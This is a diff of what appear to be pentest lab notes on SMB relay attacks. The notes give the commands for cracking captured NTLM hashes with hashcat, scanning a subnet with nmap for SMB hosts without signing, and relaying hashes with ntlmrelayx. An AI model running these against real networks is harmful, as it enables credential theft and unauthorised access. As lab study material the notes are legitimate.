@@ -36,14 +36,16 @@ syntax: `hashcat -O -m 5600 hash /usr/share/wordlists/rockyou.txt`
 
 # SMB RELAY
 
-using nmap's builtin script to search for smb status on port 445:
+####  
+Using nmap's builtin script to search for smb status on port 445:
 syntax: `nmap --script=smb2-security-mode.nse -p445  10.0.2.0/24 | grep "smb2-security-mode" -A2 -B8`
-![image](https://user-images.githubusercontent.com/76034874/187007262-4d503d3c-80fa-4744-8a6f-5baab830b309.png)
+Note: We are looking for SMB signing not required
+<img width="700" height="500" alt="image4" src="https://user-images.githubusercontent.com/76034874/187007262-4d503d3c-80fa-4744-8a6f-5baab830b309.png">
 
 ![image](https://user-images.githubusercontent.com/76034874/187007785-4e591c12-dfb8-4cea-bb3c-c09c4a7db798.png)
 
 
-#### Login in to Spiderman machine and create an event:
+#### Login in to the Windows machine and create an event:
 #### try to access a share: 10.0.2.30
 #### syntax: `ntlmrelayx.py -tf targets.txt -smb2support`
 #### We can see the hashes come through. We can either crack these or relay them.  Sometimes we find password reuse.  For example the same password found here could be used to log into the anti-virus program.
